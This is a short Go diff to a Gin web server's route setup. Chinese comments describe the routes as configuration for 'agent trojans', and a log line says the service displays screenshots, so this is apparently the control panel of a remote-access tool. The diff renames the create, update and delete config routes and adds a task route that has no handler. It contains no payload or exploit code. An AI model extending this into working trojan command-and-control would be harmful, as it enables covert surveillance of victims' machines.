@@ -42,15 +42,21 @@ func WebServer() {
 
 	// agent木马的相关配置 增加配置 删除配置 修改配置
 	agentGroup := apiGroup.Group("/agent")
+	{
+		// /agent/create
+		agentGroup.POST("/create_config", service.CreateAgentConfig)
 
-	// /agent/create
-	agentGroup.POST("/create", service.CreateAgentConfig)
+		// /agent/update
+		agentGroup.POST("/update_config", service.UpdateAgentConfig)
 
-	// /agent/update
-	agentGroup.PUT("/update", service.UpdateAgentConfig)
+		// /agent/delete
+		agentGroup.DELETE("/del_config", service.DeleteAgentConfig)
+	}
 
-	// /agent/delete
-	agentGroup.DELETE("/del", service.UpdateAgentConfig)
+	taskGroup := apiGroup.Group("/task")
+	{
+		taskGroup.POST("/create")
+	}
 
 	// 启动 Web 服务器
 	logrus.Info("启动web服务成功，此服务用于展示截图")
